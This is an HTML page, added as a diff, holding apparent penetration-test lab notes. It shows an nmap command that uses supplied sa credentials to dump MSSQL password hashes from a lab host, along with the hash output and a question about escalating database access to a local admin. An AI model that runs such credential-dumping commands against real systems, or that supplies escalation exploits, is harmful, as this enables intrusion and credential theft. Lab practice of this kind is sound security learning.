@@ -1,0 +1,34 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>nmap dump hashes</title>
+</head><body>root@:~&gt; nmap 10.11.1.31 -p 1433 --script=ms-sql-dump-hashes.nse --script-args mssql.username='sa',mssql.password='poiuytrewq'<br/>
+<br/>
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-06-18 18:47 CDT<br/>
+Nmap scan report for 10.11.1.31<br/>
+Host is up (0.048s latency).<br/>
+<br/>
+PORT &nbsp; &nbsp; STATE SERVICE<br/>
+1433/tcp open &nbsp;ms-sql-s<br/>
+| ms-sql-dump-hashes: <br/>
+| [10.11.1.31:1433]<br/>
+| &nbsp; &nbsp; sa:0x01009D2B5976843F6669C9F61C5550DB8330B3AECF81D901199997EEFD29C1FFAF836A78691712EABE0D33950B98<br/>
+|_ &nbsp; &nbsp;sqlapp:0x01000B58DE0496B6C75187A81CF86DC6F96A60553507AFAC03BBC69BD2375CC21410CAB5E37938463C139FF415DF<br/>
+MAC Address: 00:50:56:89:68:22 (VMware)<br/>
+<br/>
+Nmap done: 1 IP address (1 host up) scanned in 1.12 seconds<br/>
+root@:~&gt; <br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+"This is what I did in a nutshell...<br/>
+<br/>
+Looked at open ports, enumerated each open port. One of them gave me minimal access. With that minimal access I found info that got me better access. Then I used this better access to steal more information and create a local admin."<br/>
+<br/>
+<br/>
+<b>How can I create a local admin from my DB access?<br/>
+<br/>
+Maybe there is a python exploit I need to exploit mssql similar to how I did it with Metasploit.</b></body></html>
